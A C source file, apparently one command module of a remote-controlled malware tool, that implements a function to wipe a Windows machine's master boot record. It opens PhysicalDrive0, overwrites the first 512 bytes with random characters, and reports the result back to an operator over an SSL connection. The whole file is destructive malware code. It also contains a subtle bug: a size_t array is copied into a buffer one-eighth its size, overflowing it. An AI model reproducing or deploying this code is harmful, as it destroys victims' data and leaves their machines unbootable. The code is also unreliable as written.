#include "Variables.h"

int WipeMBR(SSL *ssl)
{
	char Success[] = "\033[0;35m[+] MBR Wiped!\033[0m\n";
	char Error[] = "\033[1;31m[-] Couldn't Wipe MBR.\033[0m\n";
	char Characters[] = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789";
	size_t MBRLength[512] = {0};
	time_t GetTime = time(NULL);
	srand((unsigned int)GetTime);

	for (int i = 0; i < 512; i++)
	{
		int GetRandIndex = rand() % (sizeof(Characters) - 1);
		MBRLength[i] = Characters[GetRandIndex];
	}

	HANDLE MBR = CreateFile("\\\\.\\PhysicalDrive0", GENERIC_ALL, FILE_SHARE_READ | FILE_SHARE_WRITE, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_SYSTEM, NULL);

	if (MBR == INVALID_HANDLE_VALUE)
	{
		SSL_write(ssl, Error, sizeof(Error));
		return EXIT_FAILURE;
	}

	char Buffer[512];
	memcpy(Buffer, MBRLength, sizeof(MBRLength));
	int Wiped = WriteFile(MBR, Buffer, 512, NULL, NULL);

	if (Wiped == 0)
	{
		CloseHandle(MBR);
		SSL_write(ssl, Error, sizeof(Error));
		return EXIT_FAILURE;
	}

	CloseHandle(MBR);
	SSL_write(ssl, Success, sizeof(Success));
	return EXIT_SUCCESS;
}
